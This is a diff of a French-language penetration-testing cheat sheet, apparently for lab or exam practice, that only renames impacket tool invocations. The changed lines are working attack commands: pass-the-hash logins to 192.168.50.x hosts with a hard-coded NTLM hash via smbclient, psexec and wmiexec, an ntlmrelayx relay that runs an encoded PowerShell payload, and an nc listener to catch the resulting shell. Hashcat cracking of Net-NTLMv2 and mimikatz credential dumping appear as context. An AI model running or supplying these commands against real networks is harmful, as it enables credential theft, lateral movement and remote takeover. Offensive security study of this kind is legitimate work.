@@ -32,9 +32,9 @@ lsadump::sam
 ```bash
 smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 
-impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+psexec.py -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
 
-impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+wmiexec.py -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
 ```
 
 # Cracking Net-NTLMv2
@@ -52,7 +52,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
 # Relaying Net-NTLMv2
 
 ```bash
-impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+ntlmrelayx.py --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
 
 nc -nvlp 8080
 ```
@@ -94,7 +94,7 @@ sekurlsa::logonpasswords
 
 **Pass-the-Hash avec le hash de domaine récupéré**
 ```bash
-impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM> CORP/Administrator@192.168.50.248
+wmiexec.py -hashes 00000000000000000000000000000000:<NTLM> CORP/Administrator@192.168.50.248
 ```
 
 ## Credential Guard activé - injection SSP
